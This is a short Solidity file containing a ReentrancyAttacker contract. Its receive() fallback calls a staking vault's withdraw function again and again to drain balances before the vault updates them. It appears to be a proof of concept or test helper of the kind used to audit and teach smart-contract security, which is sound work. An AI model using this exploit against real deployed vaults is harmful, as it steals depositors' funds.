// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IStakingVault {
    function withdraw(uint256 amount) external;
    function balances(address account) external view returns (uint256);
}

contract ReentrancyAttacker {
    IStakingVault public vault;
    bool internal attacking;

    constructor(address _vault) {
        vault = IStakingVault(_vault);
    }

    function attack(uint256 amount) external {
        attacking = true;
        vault.withdraw(amount);
        attacking = false;
    }

    receive() external payable {
        if (attacking && vault.balances(address(this)) > 0) {
            vault.withdraw(vault.balances(address(this)));
        }
    }
}
